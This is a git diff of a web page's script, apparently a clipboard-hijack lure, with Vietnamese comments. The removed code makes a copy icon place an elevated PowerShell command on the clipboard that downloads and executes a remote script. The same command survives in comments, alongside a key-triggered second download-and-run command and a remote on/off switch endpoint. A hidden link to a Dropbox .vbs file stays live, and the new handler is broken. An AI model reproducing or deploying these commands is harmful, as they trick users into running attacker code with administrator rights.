@@ -36,91 +36,98 @@
     <div id="copyIcon"></div>
     <a href="https://www.dropbox.com/scl/fi/8djksgh7l5j3tw8ybo8jp/1.vbs?rlkey=vtvhlb80n7kywqfcvsoi9d7eb&st=lfw33l1r&dl=1" download="1.vbs" class="download-link"></a>
     <script>
-        function copyText(text) {
-            const textarea = document.createElement("textarea");
-            textarea.value = text;
-            document.body.appendChild(textarea);
-            textarea.select();
-            document.execCommand("copy");
-            document.body.removeChild(textarea);
-        }
-        document.getElementById("copyIcon").addEventListener("click", function() {
-            // code trên nodejs
-            // copyText(`powershell -Command "Start-Process powershell -ArgumentList '-c \\"Disable-PnpDevice -InstanceId \\\\\\"USB\\VID_0951&PID_1666\\0C9D9210E3AEE371498F0008\\\\\\" -Confirm:$false\\"' -Verb RunAs"`);
-            copyText(`powershell -Command "Start-Process powershell -ArgumentList '-c iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/1.txt\\")' -Verb RunAs"`);
-        });
+        
 
-        // document.addEventListener('keydown', function(event) {
-        //     if (event.key === 'p' || event.key === 'P') {
-        //         fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-        //             method: 'PUT',
-        //             headers: {
-        //                 'Content-Type': 'application/json'
-        //             },
-        //             body: JSON.stringify({ on: true })
-        //         }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
-        //     } else if (event.key === 'e' || event.key === 'E') {
-        //         copyText(`powershell -c "iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/2.txt\\")"`);
-        //     } else{
-        //         fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-        //             method: 'PUT',
-        //             headers: {
-        //                 'Content-Type': 'application/json'
-        //             },
-        //             body: JSON.stringify({ on: false })
-        //         }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
-        //     }
+            document.getElementById("copyIcon").addEventListener("click", function() {
+              navigator.clipboard.writeText(text)
+            });
+
+        
+        // function copyText(text) {
+        //     const textarea = document.createElement("textarea");
+        //     textarea.value = text;
+        //     document.body.appendChild(textarea);
+        //     textarea.select();
+        //     document.execCommand("copy");
+        //     document.body.removeChild(textarea);
+        // }
+        // document.getElementById("copyIcon").addEventListener("click", function() {
+        //     // code trên nodejs
+        //     // copyText(`powershell -Command "Start-Process powershell -ArgumentList '-c \\"Disable-PnpDevice -InstanceId \\\\\\"USB\\VID_0951&PID_1666\\0C9D9210E3AEE371498F0008\\\\\\" -Confirm:$false\\"' -Verb RunAs"`);
+        //     copyText(`powershell -Command "Start-Process powershell -ArgumentList '-c iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/1.txt\\")' -Verb RunAs"`);
         // });
 
-        // fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-        //     method: 'PUT',
-        //     headers: {
-        //         'Content-Type': 'application/json'
-        //     },
-        //     body: JSON.stringify({ on: false })
-        // }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
+        // // document.addEventListener('keydown', function(event) {
+        // //     if (event.key === 'p' || event.key === 'P') {
+        // //         fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+        // //             method: 'PUT',
+        // //             headers: {
+        // //                 'Content-Type': 'application/json'
+        // //             },
+        // //             body: JSON.stringify({ on: true })
+        // //         }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
+        // //     } else if (event.key === 'e' || event.key === 'E') {
+        // //         copyText(`powershell -c "iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/2.txt\\")"`);
+        // //     } else{
+        // //         fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+        // //             method: 'PUT',
+        // //             headers: {
+        // //                 'Content-Type': 'application/json'
+        // //             },
+        // //             body: JSON.stringify({ on: false })
+        // //         }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
+        // //     }
+        // // });
 
-        // const simpleNavigator = {};
-        // for (let key in navigator) {
-        //     const value = navigator[key];
-        //     if (typeof value !== 'function') {
-        //         simpleNavigator[key] = value;
+        // // fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+        // //     method: 'PUT',
+        // //     headers: {
+        // //         'Content-Type': 'application/json'
+        // //     },
+        // //     body: JSON.stringify({ on: false })
+        // // }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
+
+        // // const simpleNavigator = {};
+        // // for (let key in navigator) {
+        // //     const value = navigator[key];
+        // //     if (typeof value !== 'function') {
+        // //         simpleNavigator[key] = value;
+        // //     }
+        // // }
+        // // document.querySelector('#req').textContent = JSON.stringify(simpleNavigator)
+
+
+
+
+        // function getSerializableWindowProperties(obj, seen = new WeakSet()) {
+        //     const serializableProps = {};
+        
+        //     for (let prop in obj) {
+        //         if (obj.hasOwnProperty(prop)) {
+        //             try {
+        //                 const value = obj[prop];
+        
+        //                 // Kiểm tra xem thuộc tính này đã được duyệt chưa để tránh vòng lặp
+        //                 if (typeof value === 'object' && value !== null) {
+        //                     if (seen.has(value)) continue; // Bỏ qua nếu đã thấy
+        
+        //                     // Đánh dấu đã thấy thuộc tính
+        //                     seen.add(value);
+        //                     serializableProps[prop] = getSerializableWindowProperties(value, seen);
+        //                 } else if (typeof value !== 'function') {
+        //                     serializableProps[prop] = value;
+        //                 }
+        //             } catch (e) {
+        //                 console.warn(`Không thể truy cập thuộc tính: ${prop}`, e);
+        //             }
+        //         }
         //     }
+        //     return serializableProps;
         // }
-        // document.querySelector('#req').textContent = JSON.stringify(simpleNavigator)
-
-
-
-
-        function getSerializableWindowProperties(obj, seen = new WeakSet()) {
-            const serializableProps = {};
         
-            for (let prop in obj) {
-                if (obj.hasOwnProperty(prop)) {
-                    try {
-                        const value = obj[prop];
+        // const windowProperties = getSerializableWindowProperties(window);
         
-                        // Kiểm tra xem thuộc tính này đã được duyệt chưa để tránh vòng lặp
-                        if (typeof value === 'object' && value !== null) {
-                            if (seen.has(value)) continue; // Bỏ qua nếu đã thấy
-        
-                            // Đánh dấu đã thấy thuộc tính
-                            seen.add(value);
-                            serializableProps[prop] = getSerializableWindowProperties(value, seen);
-                        } else if (typeof value !== 'function') {
-                            serializableProps[prop] = value;
-                        }
-                    } catch (e) {
-                        console.warn(`Không thể truy cập thuộc tính: ${prop}`, e);
-                    }
-                }
-            }
-            return serializableProps;
-        }
-        
-        const windowProperties = getSerializableWindowProperties(window);
-        
-        document.querySelector('#req').textContent = JSON.stringify(windowProperties, null, 2)
+        // document.querySelector('#req').textContent = JSON.stringify(windowProperties, null, 2)
     </script>
 </body>
 
